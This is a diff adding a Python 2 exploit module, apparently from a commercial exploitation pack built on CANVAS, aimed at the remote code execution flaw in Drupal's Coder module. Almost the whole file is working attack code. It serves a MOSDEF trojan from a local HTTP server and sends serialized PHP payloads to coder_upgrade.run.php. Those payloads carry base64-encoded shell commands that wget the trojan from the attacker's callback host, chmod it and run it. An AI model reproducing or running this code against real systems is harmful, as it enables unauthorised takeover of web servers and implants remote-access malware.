@@ -1,0 +1,267 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+import sys
+import time
+import os
+import random
+import thread
+import urllib
+import base64
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+from libs.spkproxy import header, body
+from libs.canvasos import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "Drupal Coder Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution in Drupal Coder module"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Drupal"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "< 7.x-1.3 < 7.x-2.6"
+DOCUMENTATION["Date public"] = "2016.07.15"
+DOCUMENTATION["References"] = "https://www.drupal.org/node/2765575"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME  
+		self.dstport = 80   		
+		self.cmd = ""
+		self.cmdpayload1 = "data1"
+		self.cmdpayload2 = "data2"
+		self.cmdpayload3 = "data3"                  
+		self.trojanname = "d2"
+		self.cmd = ""
+		self.basepath = "drupal731"
+		return
+ 
+	def maketrojan(self):    	
+		t_os = canvasos("Linux")
+		t_os.arch = "X86"
+	    
+		self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+		self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        		
+		file(self.trojanname, "wb").write(self.mosdeftrojan)
+		self.setInfo("%s - done"%(NAME))
+		ret = len(self.mosdeftrojan) != 0	
+
+		return ret		    
+
+	def makesploit(self, clientheader, clientbody):        
+		from libs.spkproxy import header, body
+		h = header('SERVER')
+		b = body()				
+		self.log(clientheader.URL)		        
+		if clientheader.URL.count(self.trojanname):
+			self.maketrojan()
+			self.log("Sending MOSDEF trojan")
+			f = open(self.trojanname, "rb")
+			sploitstring = f.read()
+			f.close()
+			os.remove(self.trojanname)
+			self.log("Sending %d bytes"%len(sploitstring))
+			h.addHeader("Content-type","binary/octet-stream")
+			h.addHeader("Connection","close")
+			b.setBody(sploitstring)            						            
+		elif clientheader.URL.count(self.cmdpayload1):                    
+			self.log("Sending payload for [%s]"%self.cmdpayload1)
+			cmd = "wget -O /tmp/" + self.trojanname + " http://" + self.callback.ip + "/" + self.trojanname
+			cmd = "echo %s | base64 -d | sh"%base64.b64encode(cmd)
+			sploitstring = 'a:6:{s:9:"variables";a:1:{s:17:"coder_upgrade_dir";s:3:"tmp";}s:11:"theme_cache";s:16:"theme_cache_test";s:5:"paths";a:3:{s:10:"files_base";s:0:"";s:14:"libraries_base";s:0:"";s:12:"modules_base";s:8:"../../..";}s:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:2:"d2";}}s:10:"extensions";a:1:{s:3:"php";s:3:"php";}s:5:"items";a:1:{i:0;a:3:{s:7:"old_dir";s:12:"../../images";s:7:"new_dir";s:%d:"`%s`";s:4:"name";s:2:"d2";}}}'%(len(cmd)+2,cmd)
+			self.log("Sending %d bytes"%len(sploitstring))
+			h.addHeader("Connection","close")
+			b.setBody(sploitstring)
+		elif clientheader.URL.count(self.cmdpayload2):                    
+			self.log("Sending payload for [%s]"%self.cmdpayload2)
+			cmd = "chmod 777 /tmp/" + self.trojanname
+			cmd = "echo %s | base64 -d | sh"%base64.b64encode(cmd)
+			sploitstring = 'a:6:{s:9:"variables";a:1:{s:17:"coder_upgrade_dir";s:3:"tmp";}s:11:"theme_cache";s:16:"theme_cache_test";s:5:"paths";a:3:{s:10:"files_base";s:0:"";s:14:"libraries_base";s:0:"";s:12:"modules_base";s:8:"../../..";}s:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:2:"d2";}}s:10:"extensions";a:1:{s:3:"php";s:3:"php";}s:5:"items";a:1:{i:0;a:3:{s:7:"old_dir";s:12:"../../images";s:7:"new_dir";s:%d:"`%s`";s:4:"name";s:2:"d2";}}}'%(len(cmd)+2,cmd)
+			self.log("Sending %d bytes"%len(sploitstring))
+			h.addHeader("Connection","close")
+			b.setBody(sploitstring)		
+		elif clientheader.URL.count(self.cmdpayload3):                    
+			self.log("Sending payload for [%s]"%self.cmdpayload3)
+			cmd = "/tmp/" + self.trojanname
+			cmd = "echo %s | base64 -d | sh"%base64.b64encode(cmd)            
+			sploitstring = 'a:6:{s:9:"variables";a:1:{s:17:"coder_upgrade_dir";s:3:"tmp";}s:11:"theme_cache";s:16:"theme_cache_test";s:5:"paths";a:3:{s:10:"files_base";s:0:"";s:14:"libraries_base";s:0:"";s:12:"modules_base";s:8:"../../..";}s:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:2:"d2";}}s:10:"extensions";a:1:{s:3:"php";s:3:"php";}s:5:"items";a:1:{i:0;a:3:{s:7:"old_dir";s:12:"../../images";s:7:"new_dir";s:%d:"`%s`";s:4:"name";s:2:"d2";}}}'%(len(cmd)+2,cmd)
+			self.log("Sending %d bytes"%len(sploitstring))
+			h.addHeader("Connection","close")
+			b.setBody(sploitstring)		                        		
+		return h, b
+
+	def neededListenerTypes(self):
+		from canvasengine import LINUXMOSDEF_INTEL
+		return [LINUXMOSDEF_INTEL]
+
+	#################################################################################################################
+	# Code from httpserver.py
+	def listen(self):
+		self.getargs()
+		s=self.gettcplistener(80, "0.0.0.0")
+		
+		if not s:
+			self.log("Cannot listen on port 80 - perhaps that port is already bound?")
+			return 0
+		s.set_timeout(5)
+		self.s=s
+		return s 
+	
+	def accept(self, s=None ):
+		"""
+		Try to accept one connection
+		returns true if we found one
+		"""
+		#we loop on this ,so no annoying printouts here
+		#self.log("Accepting connection")
+		if s==None:
+			s=self.s 
+		try:
+			infd,addr=s.accept()
+		except timeoutsocket.Timeout:
+			#self.log("Timed out - no accept yet")
+			return 
+		if infd==-1:
+			return
+		
+		#else we have an infd
+		self.handle(infd)
+		return True #handled connection
+	    
+	def handle(self, infd): 
+		self.log("Handling connection")
+		clientheader = header(state = "SERVER")
+		clientheader.ssl = self.ssl
+		ret = clientheader.readdata(infd)
+		clientbody = body()
+		
+		if clientheader.gotGoodHeader():
+			if clientheader.bodySize()>0 or clientheader.wasChunked:
+				self.log("Reading body")
+				clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+				self.log("Read body")
+		
+		self.log("Creating exploit response")		
+		servheader,servbody = self.makesploit(clientheader,clientbody)
+				
+		self.log("Responding")		
+		bodydata = "".join(servbody.data)		            		
+		response = ""
+		response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)		
+		self.log(response)
+		
+		for akey in servheader.headerValuesDict.keys():
+			if akey not in [ "Content-Length", "Content-length"]:
+				response += servheader.grabHeader(akey)
+				
+		self.log("Sending header data of %d bytes"%len(response))
+		chunked = 0
+		
+		if not chunked:
+			response += "Content-Length: "+str(len(bodydata))+"\r\n"
+			
+		response += "\r\n"
+		response += "".join(bodydata)
+		self.log("Total response length is %d bytes"%len(response))
+		
+		try:
+			infd.sendall(response)
+		except socket.error:
+			self.log("Connection closed by peer")
+			
+		self.log("Response sent")
+		infd.close() #connection close - later on we'll keep it.
+		return 
+	#
+	#################################################################################################################
+        
+	def startHTTPServer(self):
+		s = self.listen()
+		
+		if not s:
+			self.log("Failed to listen - not running")
+			return 0
+			
+		while 1:
+			if self.state==self.HALT:
+				self.s.close()
+				break
+			self.accept()
+		
+		self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))		
+		return 1
+
+
+	def sendcmd(self, cmd):
+		ua = spkproxy.UserAgent("", exploit=self)        		
+		ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")       		
+		url = "sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php?file=%s"%("http://" + self.callback.ip + "/" + cmd)    		
+		mainurl = "http://%s:%d/%s/%s" % (self.host, self.dstport, self.basepath, url)		
+		data = ua.GET(mainurl)
+		return data    
+		
+		    	        
+	def run(self):
+		self.host = self.target.interface
+
+		thread.start_new_thread(self.startHTTPServer,())
+				
+		self.sendcmd(self.cmdpayload1)	
+		self.sendcmd(self.cmdpayload2)
+		self.sendcmd(self.cmdpayload3)    		    			    		    		
+		    
+		while 1:
+		    time.sleep(1)			
+										          
+		self.setInfo('[D2] %s attacking %s - done' % (NAME, self.host))
+						            
+		return 1                   
+			  		
+	def usage(self):        
+		print "Usage: %s -v version -t targethost -l localip -d localport\n" % sys.argv[0]				
+		sys.exit(0) 
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
